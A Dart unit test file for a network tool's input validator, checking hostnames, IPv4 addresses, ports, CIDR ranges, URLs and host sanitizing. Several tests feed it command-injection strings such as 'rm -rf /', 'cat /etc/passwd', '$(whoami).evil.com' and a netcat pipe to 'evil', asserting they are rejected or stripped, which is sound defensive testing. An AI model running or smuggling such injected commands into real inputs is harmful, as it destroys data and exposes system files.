import 'package:flutter_test/flutter_test.dart';
import 'package:pocket_noc/core/utils/input_validator.dart';

void main() {
  group('InputValidator', () {
    group('isValidHostname', () {
      test('accepts valid hostnames', () {
        expect(InputValidator.isValidHostname('example.com'), true);
        expect(InputValidator.isValidHostname('sub.example.com'), true);
        expect(InputValidator.isValidHostname('my-server.local'), true);
        expect(InputValidator.isValidHostname('router'), true);
        expect(InputValidator.isValidHostname('a.b.c.d.e.f'), true);
      });

      test('rejects invalid hostnames', () {
        expect(InputValidator.isValidHostname(''), false);
        expect(InputValidator.isValidHostname('-invalid.com'), false);
        expect(InputValidator.isValidHostname('invalid-.com'), false);
        expect(InputValidator.isValidHostname('.invalid.com'), false);
        expect(InputValidator.isValidHostname('a' * 254), false);
      });

      test('rejects injection attempts', () {
        expect(InputValidator.isValidHostname('example.com; rm -rf /'), false);
        expect(InputValidator.isValidHostname('example.com && cat /etc/passwd'), false);
        expect(InputValidator.isValidHostname('\$(whoami).evil.com'), false);
        expect(InputValidator.isValidHostname('`id`.evil.com'), false);
        expect(InputValidator.isValidHostname('example.com | nc evil 1234'), false);
      });
    });

    group('isValidIpv4', () {
      test('accepts valid IPv4', () {
        expect(InputValidator.isValidIpv4('192.168.1.1'), true);
        expect(InputValidator.isValidIpv4('8.8.8.8'), true);
        expect(InputValidator.isValidIpv4('0.0.0.0'), true);
        expect(InputValidator.isValidIpv4('255.255.255.255'), true);
        expect(InputValidator.isValidIpv4('10.0.0.1'), true);
      });

      test('rejects invalid IPv4', () {
        expect(InputValidator.isValidIpv4(''), false);
        expect(InputValidator.isValidIpv4('256.1.1.1'), false);
        expect(InputValidator.isValidIpv4('1.2.3'), false);
        expect(InputValidator.isValidIpv4('1.2.3.4.5'), false);
        expect(InputValidator.isValidIpv4('abc.def.ghi.jkl'), false);
        expect(InputValidator.isValidIpv4('192.168.1.1; echo pwned'), false);
      });
    });

    group('isValidPort', () {
      test('accepts valid ports', () {
        expect(InputValidator.isValidPort('1'), true);
        expect(InputValidator.isValidPort('80'), true);
        expect(InputValidator.isValidPort('443'), true);
        expect(InputValidator.isValidPort('8080'), true);
        expect(InputValidator.isValidPort('65535'), true);
      });

      test('rejects invalid ports', () {
        expect(InputValidator.isValidPort(''), false);
        expect(InputValidator.isValidPort('0'), false);
        expect(InputValidator.isValidPort('-1'), false);
        expect(InputValidator.isValidPort('65536'), false);
        expect(InputValidator.isValidPort('abc'), false);
        expect(InputValidator.isValidPort('80; echo pwned'), false);
      });
    });

    group('isValidCidr', () {
      test('accepts valid CIDR', () {
        expect(InputValidator.isValidCidr('192.168.1.0/24'), true);
        expect(InputValidator.isValidCidr('10.0.0.0/8'), true);
        expect(InputValidator.isValidCidr('172.16.0.0/12'), true);
        expect(InputValidator.isValidCidr('0.0.0.0/0'), true);
        expect(InputValidator.isValidCidr('192.168.1.1/32'), true);
      });

      test('rejects invalid CIDR', () {
        expect(InputValidator.isValidCidr(''), false);
        expect(InputValidator.isValidCidr('192.168.1.0'), false);
        expect(InputValidator.isValidCidr('192.168.1.0/33'), false);
        expect(InputValidator.isValidCidr('256.0.0.0/24'), false);
        expect(InputValidator.isValidCidr('not-a-cidr'), false);
      });
    });

    group('isValidUrl', () {
      test('accepts valid URLs', () {
        expect(InputValidator.isValidUrl('https://example.com'), true);
        expect(InputValidator.isValidUrl('http://example.com'), true);
        expect(InputValidator.isValidUrl('example.com'), true);
        expect(InputValidator.isValidUrl('https://sub.example.com/path'), true);
      });

      test('rejects invalid URLs', () {
        expect(InputValidator.isValidUrl(''), false);
        expect(InputValidator.isValidUrl('a' * 2049), false);
      });
    });

    group('sanitizeHost', () {
      test('strips dangerous characters', () {
        expect(InputValidator.sanitizeHost('example.com'), 'example.com');
        expect(InputValidator.sanitizeHost('  example.com  '), 'example.com');
        expect(InputValidator.sanitizeHost('example.com;rm -rf /'), 'example.comrm-rf');
        expect(InputValidator.sanitizeHost('\$(cmd)'), 'cmd');
      });
    });

    group('isValidHost', () {
      test('accepts hostnames and IPs', () {
        expect(InputValidator.isValidHost('example.com'), true);
        expect(InputValidator.isValidHost('192.168.1.1'), true);
        expect(InputValidator.isValidHost('8.8.8.8'), true);
      });

      test('rejects garbage', () {
        expect(InputValidator.isValidHost(''), false);
        expect(InputValidator.isValidHost('!!!'), false);
      });
    });
  });
}
